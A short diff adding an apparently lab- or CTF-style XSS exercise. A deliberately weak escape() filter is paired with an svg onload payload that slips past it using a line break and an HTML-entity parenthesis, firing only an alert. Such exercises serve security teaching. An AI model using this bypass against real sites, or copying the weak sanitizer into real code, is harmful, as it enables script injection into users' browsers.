@@ -1,0 +1,16 @@
+<script>
+function escape(input) {
+    var stripTagsRE = /<\/?[^>]+>/gi;
+    input=input.replace(stripTagsRE, '');
+    input=input.replace(/[(]/g, '');
+    input=input.replace(/>|on.+?=|focus/gi, '_');
+    return '<article>' + input + '</article>';
+}
+// document.write("<h1>意见反馈预览页</h1>");
+//服务端将你的输入转成base64
+var src = `<svg/onload
+="javascript:alert&#40;'hxsf')"`
+text=decodeURIComponent(src);
+text=text.replace(/[+]/g,' ');
+document.write(escape(text));
+</script>
